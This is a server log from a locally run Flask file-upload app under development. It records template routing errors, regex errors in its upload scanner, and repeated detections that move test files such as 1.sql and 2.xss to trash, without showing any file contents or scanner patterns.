2025-02-22 17:04:40,685 - 127.0.0.1 - - [22/Feb/2025 17:04:40] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 17:04:40,689 - 127.0.0.1 - - [22/Feb/2025 17:04:40] "[31m[1mGET /upload-folder HTTP/1.1[0m" 405 -
2025-02-22 17:13:45,349 - Error scanning uploads/5-A.R: missing ), unterminated subpattern at position 17
2025-02-22 17:13:45,368 - Error scanning uploads/C-Class-shaktiweek2019.pdf: missing ), unterminated subpattern at position 17
2025-02-22 17:13:45,369 - Error scanning uploads/w.js: missing ), unterminated subpattern at position 17
2025-02-22 17:13:45,369 - Error scanning uploads/mixed_cluster.bsv: missing ), unterminated subpattern at position 17
2025-02-22 17:13:45,369 - Error scanning uploads/a.py: missing ), unterminated subpattern at position 17
2025-02-22 17:13:45,371 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 17:13:45,371 - [33mPress CTRL+C to quit[0m
2025-02-22 17:13:48,537 - 127.0.0.1 - - [22/Feb/2025 17:13:48] "[33mGET /upload-folder HTTP/1.1[0m" 404 -
2025-02-22 17:13:49,549 - 127.0.0.1 - - [22/Feb/2025 17:13:49] "[33mGET /upload-folder HTTP/1.1[0m" 404 -
2025-02-22 17:13:53,922 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 73, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 27, in top-level template code
    <form action="{{ url_for('upload_folder') }}" method="post" enctype="multipart/form-data">
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'upload_folder'. Did you mean 'upload_file' instead?
2025-02-22 17:13:53,924 - 127.0.0.1 - - [22/Feb/2025 17:13:53] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 17:13:54,695 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 73, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 27, in top-level template code
    <form action="{{ url_for('upload_folder') }}" method="post" enctype="multipart/form-data">
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'upload_folder'. Did you mean 'upload_file' instead?
2025-02-22 17:13:54,696 - 127.0.0.1 - - [22/Feb/2025 17:13:54] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 17:13:54,874 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 73, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 27, in top-level template code
    <form action="{{ url_for('upload_folder') }}" method="post" enctype="multipart/form-data">
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'upload_folder'. Did you mean 'upload_file' instead?
2025-02-22 17:13:54,875 - 127.0.0.1 - - [22/Feb/2025 17:13:54] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 17:14:14,365 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 73, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 27, in top-level template code
    <form action="{{ url_for('upload_folder') }}" method="post" enctype="multipart/form-data">
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'upload_folder'. Did you mean 'upload_file' instead?
2025-02-22 17:14:14,366 - 127.0.0.1 - - [22/Feb/2025 17:14:14] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 17:14:38,242 - Error scanning uploads/5-A.R: missing ), unterminated subpattern at position 17
2025-02-22 17:14:38,262 - Error scanning uploads/C-Class-shaktiweek2019.pdf: missing ), unterminated subpattern at position 17
2025-02-22 17:14:38,262 - Error scanning uploads/w.js: missing ), unterminated subpattern at position 17
2025-02-22 17:14:38,262 - Error scanning uploads/mixed_cluster.bsv: missing ), unterminated subpattern at position 17
2025-02-22 17:14:38,262 - Error scanning uploads/a.py: missing ), unterminated subpattern at position 17
2025-02-22 17:14:38,264 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 17:14:38,264 - [33mPress CTRL+C to quit[0m
2025-02-22 17:14:41,406 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 73, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 27, in top-level template code
    <form action="{{ url_for('upload_folder') }}" method="post" enctype="multipart/form-data">
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'upload_folder'. Did you mean 'upload_file' instead?
2025-02-22 17:14:41,408 - 127.0.0.1 - - [22/Feb/2025 17:14:41] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 17:15:23,311 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 17:15:23,311 - [33mPress CTRL+C to quit[0m
2025-02-22 17:16:35,157 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 17:16:35,157 - [33mPress CTRL+C to quit[0m
2025-02-22 17:16:44,846 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 76, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 40, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 17:16:44,848 - 127.0.0.1 - - [22/Feb/2025 17:16:44] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 17:16:45,579 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 76, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 40, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 17:16:45,580 - 127.0.0.1 - - [22/Feb/2025 17:16:45] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 17:17:40,173 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 17:17:40,173 - [33mPress CTRL+C to quit[0m
2025-02-22 17:17:43,854 - 127.0.0.1 - - [22/Feb/2025 17:17:43] "GET / HTTP/1.1" 200 -
2025-02-22 17:17:50,799 - Malicious pattern detected in uploads/1.sql
2025-02-22 17:17:50,800 - 127.0.0.1 - - [22/Feb/2025 17:17:50] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 17:17:50,804 - 127.0.0.1 - - [22/Feb/2025 17:17:50] "GET / HTTP/1.1" 200 -
2025-02-22 17:17:56,791 - Malicious pattern detected in uploads/test/test/3.py
2025-02-22 17:17:56,791 - Moved 3.py to trash due to suspicious content.
2025-02-22 17:17:56,791 - Malicious pattern detected in uploads/test/test/4.php
2025-02-22 17:17:56,791 - Moved 4.php to trash due to suspicious content.
2025-02-22 17:17:56,792 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 17:17:56,792 - Moved 1.sql to trash due to suspicious content.
2025-02-22 17:17:56,792 - Malicious pattern detected in uploads/test/test/2.xss
2025-02-22 17:17:56,792 - Moved 2.xss to trash due to suspicious content.
2025-02-22 17:17:56,792 - Malicious pattern detected in uploads/test/test/6.js
2025-02-22 17:17:56,792 - Moved 6.js to trash due to suspicious content.
2025-02-22 17:17:56,792 - Malicious pattern detected in uploads/test/test/5.txt
2025-02-22 17:17:56,792 - Moved 5.txt to trash due to suspicious content.
2025-02-22 17:17:56,795 - 127.0.0.1 - - [22/Feb/2025 17:17:56] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 17:17:56,800 - 127.0.0.1 - - [22/Feb/2025 17:17:56] "GET / HTTP/1.1" 200 -
2025-02-22 17:18:20,841 - Exception on /upload-folder [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 133, in upload_folder
    file.save(filepath)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/datastructures/file_storage.py", line 125, in save
    dst = open(dst, "wb")
FileNotFoundError: [Errno 2] No such file or directory: 'uploads/verilog/verilog/module_fn_base_alu.use'
2025-02-22 17:18:20,843 - 127.0.0.1 - - [22/Feb/2025 17:18:20] "[35m[1mPOST /upload-folder HTTP/1.1[0m" 500 -
2025-02-22 17:18:34,019 - Malicious pattern detected in uploads/test/test/3.py
2025-02-22 17:18:34,019 - Malicious pattern detected in uploads/test/test/4.php
2025-02-22 17:18:34,020 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 17:18:34,020 - Malicious pattern detected in uploads/test/test/2.xss
2025-02-22 17:18:34,021 - Malicious pattern detected in uploads/test/test/6.js
2025-02-22 17:18:34,021 - Malicious pattern detected in uploads/test/test/5.txt
2025-02-22 17:18:34,022 - 127.0.0.1 - - [22/Feb/2025 17:18:34] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 17:18:34,026 - 127.0.0.1 - - [22/Feb/2025 17:18:34] "GET / HTTP/1.1" 200 -
2025-02-22 17:19:35,531 - Malicious pattern detected in uploads/1/1.sql
2025-02-22 17:19:35,531 - Moved 1.sql to trash due to suspicious content.
2025-02-22 17:19:35,535 - 127.0.0.1 - - [22/Feb/2025 17:19:35] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 17:19:35,541 - 127.0.0.1 - - [22/Feb/2025 17:19:35] "GET / HTTP/1.1" 200 -
2025-02-22 17:20:24,337 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 17:20:24,338 - [33mPress CTRL+C to quit[0m
2025-02-22 17:20:30,813 - 127.0.0.1 - - [22/Feb/2025 17:20:30] "GET / HTTP/1.1" 200 -
2025-02-22 17:20:31,581 - 127.0.0.1 - - [22/Feb/2025 17:20:31] "GET / HTTP/1.1" 200 -
2025-02-22 17:20:32,308 - 127.0.0.1 - - [22/Feb/2025 17:20:32] "GET / HTTP/1.1" 200 -
2025-02-22 17:20:32,489 - 127.0.0.1 - - [22/Feb/2025 17:20:32] "GET / HTTP/1.1" 200 -
2025-02-22 17:20:37,788 - Malicious pattern detected in uploads/1/1.sql
2025-02-22 17:20:37,789 - Moved 1.sql to trash due to suspicious content.
2025-02-22 17:20:37,793 - 127.0.0.1 - - [22/Feb/2025 17:20:37] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 17:20:37,798 - 127.0.0.1 - - [22/Feb/2025 17:20:37] "GET / HTTP/1.1" 200 -
2025-02-22 17:21:10,673 - Malicious pattern detected in uploads/test/test/3.py
2025-02-22 17:21:10,673 - Moved 3.py to trash due to suspicious content.
2025-02-22 17:21:10,674 - Malicious pattern detected in uploads/test/test/4.php
2025-02-22 17:21:10,674 - Moved 4.php to trash due to suspicious content.
2025-02-22 17:21:10,674 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 17:21:10,675 - Moved 1.sql to trash due to suspicious content.
2025-02-22 17:21:10,675 - Malicious pattern detected in uploads/test/test/2.xss
2025-02-22 17:21:10,675 - Moved 2.xss to trash due to suspicious content.
2025-02-22 17:21:10,675 - Malicious pattern detected in uploads/test/test/6.js
2025-02-22 17:21:10,675 - Moved 6.js to trash due to suspicious content.
2025-02-22 17:21:10,676 - Malicious pattern detected in uploads/test/test/5.txt
2025-02-22 17:21:10,676 - Moved 5.txt to trash due to suspicious content.
2025-02-22 17:21:10,679 - 127.0.0.1 - - [22/Feb/2025 17:21:10] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 17:21:10,684 - 127.0.0.1 - - [22/Feb/2025 17:21:10] "GET / HTTP/1.1" 200 -
2025-02-22 17:25:02,166 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 17:25:02,166 - [33mPress CTRL+C to quit[0m
2025-02-22 17:25:06,230 - 127.0.0.1 - - [22/Feb/2025 17:25:06] "GET / HTTP/1.1" 200 -
2025-02-22 17:52:10,782 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 17:52:10,782 - [33mPress CTRL+C to quit[0m
2025-02-22 17:52:15,889 - 127.0.0.1 - - [22/Feb/2025 17:52:15] "GET / HTTP/1.1" 200 -
2025-02-22 17:52:22,042 - Malicious pattern detected in uploads/test/test/3.py
2025-02-22 17:52:22,042 - Moved 3.py to trash due to suspicious content.
2025-02-22 17:52:22,042 - Malicious pattern detected in uploads/test/test/4.php
2025-02-22 17:52:22,043 - Moved 4.php to trash due to suspicious content.
2025-02-22 17:52:22,043 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 17:52:22,043 - Moved 1.sql to trash due to suspicious content.
2025-02-22 17:52:22,043 - Malicious pattern detected in uploads/test/test/2.xss
2025-02-22 17:52:22,043 - Moved 2.xss to trash due to suspicious content.
2025-02-22 17:52:22,043 - Malicious pattern detected in uploads/test/test/6.js
2025-02-22 17:52:22,043 - Moved 6.js to trash due to suspicious content.
2025-02-22 17:52:22,043 - Malicious pattern detected in uploads/test/test/5.txt
2025-02-22 17:52:22,043 - Moved 5.txt to trash due to suspicious content.
2025-02-22 17:52:22,047 - 127.0.0.1 - - [22/Feb/2025 17:52:22] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 17:52:22,052 - 127.0.0.1 - - [22/Feb/2025 17:52:22] "GET / HTTP/1.1" 200 -
2025-02-22 17:52:29,491 - Malicious pattern detected in uploads/test/test/3.py
2025-02-22 17:52:29,492 - Moved 3.py to trash due to suspicious content.
2025-02-22 17:52:29,492 - Malicious pattern detected in uploads/test/test/4.php
2025-02-22 17:52:29,492 - Moved 4.php to trash due to suspicious content.
2025-02-22 17:52:29,492 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 17:52:29,492 - Moved 1.sql to trash due to suspicious content.
2025-02-22 17:52:29,492 - Malicious pattern detected in uploads/test/test/2.xss
2025-02-22 17:52:29,492 - Moved 2.xss to trash due to suspicious content.
2025-02-22 17:52:29,492 - Malicious pattern detected in uploads/test/test/6.js
2025-02-22 17:52:29,492 - Moved 6.js to trash due to suspicious content.
2025-02-22 17:52:29,493 - Malicious pattern detected in uploads/test/test/5.txt
2025-02-22 17:52:29,493 - Moved 5.txt to trash due to suspicious content.
2025-02-22 17:52:29,495 - 127.0.0.1 - - [22/Feb/2025 17:52:29] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 17:52:29,499 - 127.0.0.1 - - [22/Feb/2025 17:52:29] "GET / HTTP/1.1" 200 -
2025-02-22 17:52:47,516 - Malicious pattern detected in uploads/test/test/3.py
2025-02-22 17:52:47,517 - Malicious pattern detected in uploads/test/test/4.php
2025-02-22 17:52:47,517 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 17:52:47,517 - Malicious pattern detected in uploads/test/test/2.xss
2025-02-22 17:52:47,517 - Malicious pattern detected in uploads/test/test/6.js
2025-02-22 17:52:47,517 - Malicious pattern detected in uploads/test/test/5.txt
2025-02-22 17:52:47,519 - 127.0.0.1 - - [22/Feb/2025 17:52:47] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 17:52:47,524 - 127.0.0.1 - - [22/Feb/2025 17:52:47] "GET / HTTP/1.1" 200 -
2025-02-22 17:53:12,705 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 17:53:12,705 - [33mPress CTRL+C to quit[0m
2025-02-22 17:53:15,414 - 127.0.0.1 - - [22/Feb/2025 17:53:15] "GET / HTTP/1.1" 200 -
2025-02-22 17:53:21,074 - Malicious pattern detected in uploads/app.py
2025-02-22 17:53:21,075 - 127.0.0.1 - - [22/Feb/2025 17:53:21] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 17:53:21,080 - 127.0.0.1 - - [22/Feb/2025 17:53:21] "GET / HTTP/1.1" 200 -
